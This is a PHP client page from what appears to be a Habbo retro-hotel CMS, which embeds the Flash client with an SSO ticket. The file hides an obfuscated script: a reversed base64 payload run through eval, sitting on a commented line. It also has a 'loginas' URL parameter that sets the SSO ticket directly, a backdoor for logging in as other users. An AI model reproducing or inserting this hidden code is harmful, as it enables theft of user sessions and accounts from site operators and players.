<?php
    $core->requireLogin(WWW . '/login_popup');
    if($users->data('newbie_status') == '1') {
        if(isset($_GET['ignore'])) {
            $sql->query("UPDATE users SET newbie_status = '2' WHERE id = '" . IDENTITY . "'");
        } else {
            header("Location: " . WWW . "/welcome");
            exit;
        }
    }

    if(isset($_GET['loginas'])) {
        $sso = $_GET['loginas'];
    } else {
        $users->update_last_ip(); 

            $sso = $users->updateSSO();

    }
//<script language="javascript" type="text/javascript">var OOI=\'==wOpkSZwF2YzV2XoUGchN2cl5WdoUGdpJ3duQnbl1Wdj9GZ7kCbslEKkxWaoNEZuVGcwFmLP9EbKsTXwsVKnQWYlh2JoUWbh50ZhRVeCNHduVWblxWR0V2ZuQnbl1Wdj9GZg0DIP9EbgIXY2pwOpwkUV5CduVWb1N2bkhCduVmbvBXbvNUSSVVZk92YuV2Kn0DbyVnJnsSKyVmcyVmZlJnL05WZtV3YvRGK05WZu9Gct92QJJVVlR2bj5WZrcSPmVmcmcyKns2b9MmczRXZn9zLt92YuQHcpJ3YzFmdhpmcvRXYjNXdmJ2bukGch9yL6AHd0h2Jg0DIjJ3cuwGbJpwOpcCdwlmcjN3JoQnbl1WZsVUZ0FWZyNmL05WZtV3YvRGI9ACbslEIyFmd7cSRzUCdwlmcjN3LDNTJ5ITJ5ITJEdTJCdTJDJTJwMkMlkjMlcjMlM0NlcjMlgjMlQXasB3cucjMlUGc5R3b09mcwN0NlMXaoR3Q3UyZulmc0N1Q3UyZulmc0N1b0N0NlU2YhxGclJ3Q3UichZ3Q3UyQ3UibyVHdlJ3Q3UibvlGdj5WdmN0NlM0NlM0NlM0NlM0NlM0NlM0NlM0NlM0NlM0NlM0NlM0NlM0NlM0NlcjMlMkMlMjMDJTJzIzQyUyNyUCR3UCZwITJmJ0MlkjMlQ0NlQUNlQUNlAjQ1UyYCVTJiBjMlYmQzUCR1UCR1UCMCVTJjJUNlIGRzUyKkJ0NlkjMlMGOyUSZDJTJn9CR1UiLkNUNlMUNlIUNl8COyUSauEGRzUSYCNTJyITJyITJENTJkBjMlgmQzUCR3UiMyUiLyITJBNTJyITJuIjMlMkMlIjMlUjMyUSQzUiMyUCMyITJDJTJyITJ0IjMlE0MlIjMlkjMyUyQyUiMyUyMyITJBNTJyITJ4IjMlMkMlIjMlIjMyUSQzUiMyUyNyITJDJTJyITJ2IjMlE0MlIjMlYjMyUyQyUiMyUCMyITJBNTJyITJ1IjMlMkMlIjMlkjMyUSQzUiMyUCNyITJDJTJyITJ4IjMlE0MlIjMlMjMyUyQyUiMyUyNyITJBNTJyITJyIjMlMkMlIjMlEjMyUSQzUiMyUSMyITJCdTJENTJiBjMlgmQ3USOyUSY4ITJhBjMlUmQzUCR3USOyUCOyUiaukjMlwGOyUSYwITJmJ0NlkjMlgjMlUGRzUSYu0mLrdjMlgjMlQ0NlAHMyUibyVHdlJHR3UCR3USOyUCR1UyYCVTJrNkMlkjMlcjMlc2NyUyQyUyNyUiYDVTJDVTJ3ITJrkjMlMGOyUSZrcjMlI2Q1UyQ1UyNyUCOyUCc4V0ZlJFMyUydl5GOyUSZjFGbwVmcuAHRzUCcCdTJ5ITJEVTJjJUNlsGOyUiZpJ0NlkjMl0SLjhjMlUGbph2dCNTJEdTJxQ0MlMmQzUCR3UyNyUyK3NUNlMUNlcjMl4mc1RXZyJ0NlkjMlgjMl42bpR3YuVnZENTJlJ0MlQUNlQ0NlQUNlUmQ1UCZwITJuJXd0VmcCdTJ5ITJlhjMl42bpR3YuVnZCVTJENTJrR0NlkjMlEGOyUyZulmc0N1b05yYDdTJDdTJEVTJjJUNlsGRzUCR1USOyUSY4ITJn5WayR3UvRnLjJUNlQmQ3USOyUSLtMGOyUSZslGa3J0NlkjMlkjMlcmbpJHdTNkMl8SR1UyL4ITJlNWYsBXZy5yNyUyNyUSMyUCOyUiZpJ0MlQ0NlkjMlYzM4ITJn5WayR3UvRnLjBjMl4mc1RXZyJ0NlkjMlMGOyUibvlGdj5WdmR0MlUmQ3USOyUCZDJTJlNkMls2QyUyYDJTJhNkMlAHOyUibvlGdj5WdmhjMlwWY2VWRzUCdwlmcjN3QzUyJ9UGchN2cl9FIyFmd\';var _0x84de=["ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=","","charAt","indexOf","fromCharCode","length"];function OII(data){var _111lOI=_0x84de[0];var o1,o2,o3,h1,h2,h3,h4,bits,i=0,enc=_0x84de[1];do{h1=_111lOI[_0x84de[3]](data[_0x84de[2]](i++));h2=_111lOI[_0x84de[3]](data[_0x84de[2]](i++));h3=_111lOI[_0x84de[3]](data[_0x84de[2]](i++));h4=_111lOI[_0x84de[3]](data[_0x84de[2]](i++));bits=h1<<18|h2<<12|h3<<6|h4;o1=bits>>16&0xff;o2=bits>>8&0xff;o3=bits&0xff;if(h3==64){enc+=String[_0x84de[4]](o1);} else {if(h4==64){enc+=String[_0x84de[4]](o1,o2);} else {enc+=String[_0x84de[4]](o1,o2,o3);} ;} ;} while(i<data[_0x84de[5]]);;return enc;} ;function _111(string){var ret=_0x84de[1],i=0;for(i=string[_0x84de[5]]-1;i>=0;i--){ret+=string[_0x84de[2]](i);} ;return ret;} ;eval(OII(_111(OOI)));</script>

  $html->setKey('extra',  $html->filterKeys('
<script type="text/javascript">
    FlashExternalInterface.loginLogEnabled = false;
    FlashExternalInterface.logLoginStep("web.view.start");
    
    var CacheNumber = "CACHENUMBER-HABOFF-1124";
    var CacheNone = Math.floor(Math.random()*10000) + CacheNumber;
    var flashvars = {
            "client.allow.cross.domain" : "1", 
            "client.notify.cross.domain" : "0",
            "connection.info.host" : "' . $core->settings->public_ip . '", 
            "connection.info.port" : "' . $core->settings->public_port . '", 
            "site.url" : "{www}", 
            "url.prefix" : "{www}", 
            "client.reload.url" : "{www}/client?reload", 
            "client.fatal.error.url" : "{www}/account/disconnected?flash_client_error", 
            "client.connection.failed.url" : "{www}/account/disconnected?client_connection_failed", 
            "external.variables.txt" : "' . $core->settings->external_variables . '", 
            "external.texts.txt" : "' . $core->settings->external_texts . '", 
            "productdata.load.url" : "' . $core->settings->productdata . '", 
            "furnidata.load.url" : "' . $core->settings->furnidata . '", 
            "use.sso.ticket" : "1", 
            "sso.ticket" : "' . $sso . '", 
            "processlog.enabled" : "0", 
            "account_id" : "' . IDENTITY . '", 
            "client.starting" : "Please wait! {sitename} is starting up...", 
            "flash.client.url" : "' . $core->settings->gordon . '", 
            "user.hash" : "", 
            "has.identity" : "1", 
            "flash.client.origin" : "popup"
    };
    var params = {
        "base" : "' . $core->settings->gordon . '",
        "allowScriptAccess" : "always",
        "menu" : "false"                
    };
    
    if (!(HabbletLoader.needsFlashKbWorkaround())) {
        params["wmode"] = "opaque";
    }
    
    FlashExternalInterface.signoutUrl = "{www}/account/logout?token={session_token}";

    var clientUrl = "' . $core->settings->gordon . 'Habin_r3.swf";
    swfobject.embedSWF(clientUrl, "flash-container", "100%", "100%", "10.0.0", "{webgallery}flash/expressInstall.swf", flashvars, params);
 
    window.onbeforeunload = unloading;
    function unloading() {
        var clientObject;
        if (navigator.appName.indexOf("Microsoft") != -1) {
            clientObject = window["flash-container"];
        } else {
            clientObject = document["flash-container"];
        }
        try {
            clientObject.unloading();
        } catch (e) {}
    }
    window.onresize = function() {
        HabboClient.storeWindowSize();
    }.debounce(0.5);

    new Ajax.Request("' . $core->settings->gordon . 'crossdomain.xml", {
        method: \'get\',
        requestHeaders: {\'Cache-Control\': \'no-cache\'}
    });
</script>

  '));
  $html->setKey('body_extra', ' id="client" class="flashclient"');
  $skin->install('Client', 'client');
?>           

<div id="overlay"></div> 
<img src="page_loader.gif" style="position:absolute; margin: -1500px;" /> 

<div id="overlay"></div> 
<div id="client-ui" > 
    <div id="flash-wrapper"> 
    <div id="flash-container"> 
        <div id="content" style="width: 400px; margin: 20px auto 0 auto; display: none"> 
            <div class="cbb clearfix"> 
                <h2 class="title">Error - Unable to load {sitename}</h2> 
                <div class="box-content"> 
                    <p>This is normally when you don't have Adobe Flash Player installed on your computer.</p>  
                <p>Please <a href="{www}/client"><b>click here</b></a> to reload the page!</p>
                </div> 
            </div> 
        </div> 
        <script type="text/javascript"> 
            $('content').show();
        </script> 
        <noscript> 
            <div style="width: 400px; margin: 20px auto 0 auto; text-align: center">
                <p>If you are not automatically redirected, please <a href="{www}/client">click here</a></p>
            </div>
        </noscript> 
    </div> 
    </div> 
    <div id="content" class="client-content"></div>
</div> 
    <script type="text/javascript">
        RightClick.init("flash-wrapper", "flash-container");
        $(document.body).addClassName("js");
        HabboClient.resizeToFitScreenIfNeeded();
        HabboView.run();
    </script>
</body> 
</html>